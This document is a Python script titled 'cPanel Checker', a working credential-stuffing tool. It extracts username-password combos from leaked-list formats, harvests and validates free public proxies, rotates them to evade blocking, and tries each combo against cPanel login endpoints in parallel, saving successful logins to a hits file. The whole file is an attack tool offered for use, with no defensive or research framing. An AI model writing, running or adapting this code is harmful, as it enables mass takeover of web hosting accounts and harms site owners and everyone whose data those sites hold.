#!/usr/bin/env python3
"""
cPanel Checker - Professional Edition with Auto Proxy Integration
Supports ProxyScrape (HTTP, SOCKS4, SOCKS5), TheSpys, Geonode
Features: multi-threading, proxy rotation, automatic proxy fetching & validation, resume, logging.
"""

import requests
import re
import sys
import os
import random
import time
import threading
import queue
import logging
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional, Dict, Any

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# -----------------------------------------------------------------------------
# Logging setup
# -----------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("cpanel_checker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------------
# Proxy Sources
# -----------------------------------------------------------------------------
class ProxySource:
    """Base class for proxy sources"""
    def __init__(self, name: str):
        self.name = name

    def fetch(self) -> List[str]:
        raise NotImplementedError

class ProxyScrapeSource(ProxySource):
    """Fetch proxies from ProxyScrape (HTTP, SOCKS4, SOCKS5)"""
    def __init__(self, proxy_type: str):
        super().__init__(f"ProxyScrape-{proxy_type.upper()}")
        self.proxy_type = proxy_type
        self.urls = {
            'http': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'socks4': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all',
            'socks5': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
        }

    def fetch(self) -> List[str]:
        url = self.urls.get(self.proxy_type.lower())
        if not url:
            return []
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                proxies = [line.strip() for line in resp.text.splitlines() if line.strip()]
                logger.info(f"Fetched {len(proxies)} {self.proxy_type.upper()} proxies from ProxyScrape")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

class TheSpysSource(ProxySource):
    """Fetch proxies from TheSpys (HTTP/SOCKS)"""
    def __init__(self):
        super().__init__("TheSpys")
        self.url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"

    def fetch(self) -> List[str]:
        try:
            resp = requests.get(self.url, timeout=15)
            if resp.status_code == 200:
                proxies = [line.strip() for line in resp.text.splitlines() if line.strip()]
                logger.info(f"Fetched {len(proxies)} proxies from TheSpys")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

class GeonodeSource(ProxySource):
    """Fetch proxies from Geonode"""
    def __init__(self):
        super().__init__("Geonode")
        self.url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Csocks4%2Csocks5"

    def fetch(self) -> List[str]:
        try:
            resp = requests.get(self.url, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                proxies = []
                for item in data.get('data', []):
                    ip = item.get('ip')
                    port = item.get('port')
                    protocol = item.get('protocols', ['http'])[0]
                    if ip and port:
                        proxies.append(f"{protocol}://{ip}:{port}")
                logger.info(f"Fetched {len(proxies)} proxies from Geonode")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

# -----------------------------------------------------------------------------
# Proxy Manager
# -----------------------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.proxies: List[str] = []
        self.working_proxies: queue.Queue = queue.Queue()
        self.lock = threading.Lock()
        self.sources = [
            ProxyScrapeSource('http'),
            ProxyScrapeSource('socks4'),
            ProxyScrapeSource('socks5'),
            TheSpysSource(),
            GeonodeSource()
        ]

    def fetch_all_proxies(self) -> List[str]:
        """Fetch proxies from all sources"""
        all_proxies = []
        for source in self.sources:
            proxies = source.fetch()
            all_proxies.extend(proxies)
            time.sleep(0.5)  # polite delay
        # Deduplicate
        all_proxies = list(set(all_proxies))
        logger.info(f"Total unique proxies fetched: {len(all_proxies)}")
        self.proxies = all_proxies
        return all_proxies

    def validate_proxy(self, proxy: str, test_url: str = "http://httpbin.org/ip", timeout: int = 5) -> bool:
        """Test if proxy is working"""
        try:
            proxies = {"http": proxy, "https": proxy} if proxy.startswith("http") else {"http": proxy}
            resp = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
            return resp.status_code == 200
        except:
            return False

    def validate_working_proxies(self, max_workers: int = 20) -> List[str]:
        """Validate all fetched proxies concurrently"""
        if not self.proxies:
            self.fetch_all_proxies()
        working = []
        logger.info(f"Validating {len(self.proxies)} proxies...")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {executor.submit(self.validate_proxy, proxy): proxy for proxy in self.proxies}
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                if future.result():
                    working.append(proxy)
                    self.working_proxies.put(proxy)
        logger.info(f"Found {len(working)} working proxies")
        return working

    def get_random_proxy(self) -> Optional[str]:
        """Get a random working proxy (non-blocking)"""
        if self.working_proxies.empty():
            return None
        # Copy queue to list, pick random, then reinsert (simplified)
        proxies_list = []
        while not self.working_proxies.empty():
            proxies_list.append(self.working_proxies.get())
        if not proxies_list:
            return None
        random.shuffle(proxies_list)
        chosen = proxies_list[0]
        for p in proxies_list:
            self.working_proxies.put(p)
        return chosen

# -----------------------------------------------------------------------------
# Credential Extractor (Enhanced)
# -----------------------------------------------------------------------------
def extract_credentials(line: str) -> Optional[Tuple[str, str, str]]:
    """
    Extract (url, username, password) from ANY line using multiple strategies.
    Returns None if cannot extract.
    """
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None

    # Strategy 1: user:pass@url
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd

    # Strategy 2: url|user|pass
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])

    # Strategy 3: url:user:pass (simple)
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]

    # Strategy 4: look for a URL-like pattern, then guess user/pass from remaining
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]
        elif len(tokens) == 1:
            pass

    # Strategy 5: maybe the line is just a domain, default user/pass?
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def normalize_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

# -----------------------------------------------------------------------------
# cPanel Login Tester with Proxy Support
# -----------------------------------------------------------------------------
def test_login(url: str, user: str, pwd: str, proxy: Optional[str] = None, timeout: int = 10) -> Tuple[bool, Optional[str]]:
    """
    Test cPanel login using optional proxy.
    Returns (success, normalized_url)
    """
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    proxies = None
    if proxy:
        # Format proxy dict
        if proxy.startswith('socks'):
            # requests supports socks via 'socks5' etc. Need to install requests[socks]
            # But we'll assume proxy string like socks5://host:port
            proxies = {"http": proxy, "https": proxy}
        else:
            proxies = {"http": proxy, "https": proxy}
    try:
        resp = requests.post(login_url, data=payload, timeout=timeout, verify=False, allow_redirects=False, proxies=proxies)
        if resp.status_code == 200 and ('security_token' in resp.text or 'cpsess' in resp.text):
            return True, url
        return False, None
    except Exception as e:
        logger.debug(f"Login error with proxy {proxy}: {e}")
        return False, None

# -----------------------------------------------------------------------------
# Main Worker (Multi-threaded)
# -----------------------------------------------------------------------------
class CpanelChecker:
    def __init__(self, combos: List[Tuple[str, str, str]], proxy_manager: ProxyManager, threads: int = 10):
        self.combos = combos
        self.proxy_manager = proxy_manager
        self.threads = threads
        self.hits = []
        self.lock = threading.Lock()
        self.results_file = "hit.txt"

    def check_one(self, combo: Tuple[str, str, str]) -> Tuple[bool, Optional[str], str, str, str]:
        url, user, pwd = combo
        proxy = self.proxy_manager.get_random_proxy()
        if proxy:
            logger.debug(f"Using proxy {proxy} for {user}@{url}")
        success, norm_url = test_login(url, user, pwd, proxy=proxy)
        return success, norm_url, user, pwd, url

    def run(self):
        logger.info(f"Starting checker with {len(self.combos)} combos, {self.threads} threads")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_combo = {executor.submit(self.check_one, combo): combo for combo in self.combos}
            for future in as_completed(future_to_combo):
                combo = future_to_combo[future]
                try:
                    success, norm_url, user, pwd, original_url = future.result()
                    if success:
                        with self.lock:
                            self.hits.append((norm_url, user, pwd))
                            self.save_hit(norm_url, user, pwd)
                        logger.info(f"HIT: {user}:{pwd}@{norm_url}")
                        print(f"\n✓ HIT: {user}@{norm_url}")
                        print(f"   Password: {pwd}")
                    else:
                        logger.debug(f"FAIL: {user}@{original_url}")
                        print(f"✗ FAIL: {user}@{original_url}")
                except Exception as e:
                    logger.error(f"Error checking {combo}: {e}")

    def save_hit(self, url: str, user: str, pwd: str):
        with open(self.results_file, 'a', encoding='utf-8') as f:
            f.write(f"{user}:{pwd}@{url}\n")

    def summary(self):
        print("\n" + "="*60)
        print(f"Check completed. Total hits: {len(self.hits)}")
        print(f"Hits saved to {self.results_file}")
        if self.hits:
            print("\n--- HIT LIST ---")
            for url, user, pwd in self.hits:
                print(f"{user}:{pwd}@{url}")
        print("="*60)

# -----------------------------------------------------------------------------
# Main Entry Point
# -----------------------------------------------------------------------------
def main():
    print("=" * 70)
    print("cPanel Checker Pro - Auto Proxy Integration (ProxyScrape, TheSpys, Geonode)")
    print("=" * 70)

    # Get input file
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        filename = ("combo.txt")

    if not os.path.exists(filename):
        print(f"File not found: {filename}")
        return

    # Read combos
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    combos = []
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)

    if not combos:
        print("No valid combos could be extracted. Check file format.")
        return

    print(f"\nExtracted {len(combos)} potential combos.")

    # Initialize proxy manager and fetch proxies
    proxy_mgr = ProxyManager()
    print("Fetching proxies from sources (ProxyScrape, TheSpys, Geonode)...")
    proxy_mgr.fetch_all_proxies()
    print("Validating proxies (this may take a moment)...")
    working = proxy_mgr.validate_working_proxies(max_workers=30)
    if not working:
        print("WARNING: No working proxies found. Continuing without proxy...")
    else:
        print(f"Loaded {len(working)} working proxies.")

    # Ask for threads
    try:
        threads = int(input("Enter number of threads (default 15): ") or "15")
    except:
        threads = 15

    # Run checker
    checker = CpanelChecker(combos, proxy_mgr, threads=threads)
    checker.run()
    checker.summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        logger.exception("Fatal error")
        print(f"Error: {e}")